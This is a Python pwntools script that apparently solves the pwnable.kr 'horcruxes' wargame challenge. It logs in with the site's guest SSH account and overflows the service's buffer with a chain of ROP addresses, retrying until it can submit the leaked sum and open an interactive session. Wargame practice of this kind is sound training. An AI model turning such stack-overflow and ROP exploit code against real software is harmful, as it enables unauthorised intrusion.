#!/bin/python
from pwn import *

print("\n\n\n\nThe exploit works only 50% of the time if it fails rerun it\n\n\n\n")
session = ssh(host="pwnable.kr", user="horcruxes", port=2222, password="guest")
def exe():
    # setup:
    p = session.process(['nc', '0', '9032'])
    print(p.recv().decode())
    p.sendline(b'1')
    print(p.recv().decode())

    # payload:
    padding = 0x78*b'a'
    rop_address = p32(0x0804129d)
    rop_address2 = p32(0x080412cf)
    rop_address3 = p32(0x8041301)
    rop_address4 = p32(0x8041333)
    rop_address5 = p32(0x8041365)
    rop_address6 = p32(0x8041397)
    rop_address7 = p32(0x80413c9)
    rop_address8 = p32(0x804150b)
    payload = padding + rop_address + rop_address2 + rop_address3 + rop_address4 + rop_address5 + rop_address6 + rop_address7 + rop_address8
    p.sendline(payload)

    return (p.recv().decode(), p)

count = 0
p = 0
response = ""
while True:
    count += 1
    response,p = exe()
    print(f"\n\n\n\nIteration num {count}")
    if 'You found "Harry Potter"' in response:
        print(response)
        print("success")
        break

exp = re.findall('EXP \+-?\d+', response)
print(exp)

sign_exp = [int(re.findall('-?\d+', val)[0]) for val in exp]
unsign_exp = [u32(p32(val, sign=True)) for val in sign_exp]
exp_sum_u32 = sum(unsign_exp) & 0xFFFFFFFF
print(exp_sum_u32)

p.sendline(b'1')
p.sendline(str(exp_sum_u32).encode())
p.interactive()
